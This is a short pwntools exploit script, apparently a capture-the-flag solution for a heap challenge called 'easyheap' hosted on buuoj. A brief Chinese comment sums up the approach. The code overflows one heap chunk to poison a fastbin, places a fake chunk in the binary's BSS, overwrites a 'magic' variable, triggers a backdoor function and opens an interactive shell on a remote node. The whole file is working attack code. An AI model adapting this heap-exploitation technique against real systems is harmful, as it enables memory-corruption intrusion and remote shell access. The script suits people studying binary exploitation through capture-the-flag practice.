from pwn import *

'''
思路：通过堆溢出来控制任意地址chunk分配，然后修改magic变量使其符合要求，最终执行后门函数获取shell
'''

p = remote('node4.buuoj.cn', 28604)
# p = process('./eas    yheap')
# gdb.attach(p)

# 对应于服务端的函数
def malloc(size: int):
    p.sendlineafter(b'Your choice :', b'1')
    p.recvuntil(b'Size of Heap : ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content of heap:')
    p.sendline(b'a')
    
def writeHeap(index: int, size: int, content: bytes):
    p.sendlineafter(b'Your choice :', b'2')
    p.recvuntil(b'Index :')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size of Heap : ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content of heap : ')
    p.sendline(content)

def deleteHeap(index:int):
    p.sendlineafter(b'Your choice :', b'3')
    p.recvuntil(b'Index :')
    p.sendline(str(index).encode())

heap_array = 0x6020c0
magic_addr = 0x6020a0
l33t_func = 0x400c50

malloc(0x60) # id 0
malloc(0x60) # id 1
malloc(0x60) # id 2
deleteHeap(1)
payload = b'a'*0x68 + p64(0x71) + p64(0x602090-3)
writeHeap(0, len(payload), payload)
malloc(0x60) # id 1
malloc(0x60) # id 3, fake chunk on bss
writeHeap(3, 11 , b'a'*3+p64(0x1306))
p.sendline(b'4869')
p.interactive()
